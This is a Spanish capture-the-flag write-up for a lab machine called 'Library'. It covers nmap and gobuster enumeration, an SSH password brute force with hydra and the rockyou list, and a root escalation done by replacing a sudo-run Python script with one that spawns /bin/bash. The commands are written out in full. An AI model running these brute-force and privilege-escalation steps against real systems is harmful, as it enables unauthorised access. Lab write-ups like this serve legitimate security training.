# Write-up Library

**Autor**: Asier González

## Reconocimiento

1. Empiezo con un scaneo completo: 
2. `db_nmap -sV -sC -O -A -T4 -p- -Pn IP`

![nmap](images/nmap.png)

Descubro dos puertos abiertos:

- 22/tcp (SSH)
- 80/tcp (HTTP)

![ports](images/ports.png)

## Enumeracion

1. Decido usar gobuster para enumerar directorios:
2. `gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt`

![gobuster](images/gobuster.png)

Los unicos directorios abiertos son:

- robots.txt
- index.html

Cuando voy a robots.txt veo que pone:

`user-agent: rockyou`

Entiendo que me sugiere hacer fuerza-bruta con la lista de rockyou.

![robots](images/robots.png)

Antes de hacer nada voy a mirar la otra ruta `index.html`

Encuentro que hay un usuario llamado `meliodas`, que es el que publica entradas, y luego en comentarios hay otros varios usuarios:

`root, www-data y Anonymous`

![meliodas](images/meliodas.png)
![users](images/users.png)

## Explotación

Pruebo fuerza bruta con hydra primero con el usuario `meliodas` y la lista de rockyou:

`hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -t 4 -vV ssh://IP -f`

Encuentro la contraseña para este usuario: `iloveyou1`


![password](images/password.png)

Nos conectamos a la máquina con las credenciales obtenidas.

![login](images/login.png)

Lo primero es ver que permisos tenemos:
Probé con getuid, id, whoami, y por ultimo:

`sudo -l`

![sudo](images/sudo.png)

![id](images/id.png)

Solo tenemos permisos para ejecutar: python y el archivo bak.py 
La shell inicial no es interactiva (sin TTY), lo que limitaba muchos comandos: no deja usar su, sudo, getuid...

Tras mirar el archivo bak.py veo que se ejecuta como root.

El problema es que el archivo también pertenece a root, por lo que no podemos modificarlo. Pero podemos borrarlo y crear uno nuevo con el mismo nombre pero con una mejora para que abra como root una shell.

Comprobacion: `ls -ld /home/meliodas` esto nos muestra que podemos eliminar y crear archivos en el directorio donde estoy.

## Escalada de privilegios

Borro el archivo original: `rm -f bak.py`
Creo de nuevo el archivo: `touch bak.py`

Escribo el código en el archivo para poder ejecutar una shell como root: 
Podemos usar tanto:

`echo 'import pty; pty.spawn("/bin/bash")' > bak.py`

como:

`echo 'import os; os.system("/bin/bash")' > bak.py`

Este código ejecuta una shell bash. Al ejecutarse mediante sudo, se lanza con privilegios de root.

`sudo python /home/meliodas/bak.py`

Importante poner la ruta completa del archivo porque sino detecta la ruta de /usr/bin... y no te deja porque solo tienes permisos en tu directorio.

![commands](images/commands.png)

![root](images/root.png)

Ya disponemos de permisos de root.


## Resultado

### Resumen de vulnerabilidad:

Esta vulnerabilidad se debe a una mala configuración de permisos:

- El usuario puede ejecutar Python como root mediante sudo
- El directorio es escribible, permitiendo modificar scripts ejecutados con privilegios elevados

Esto permite ejecutar código arbitrario como root.
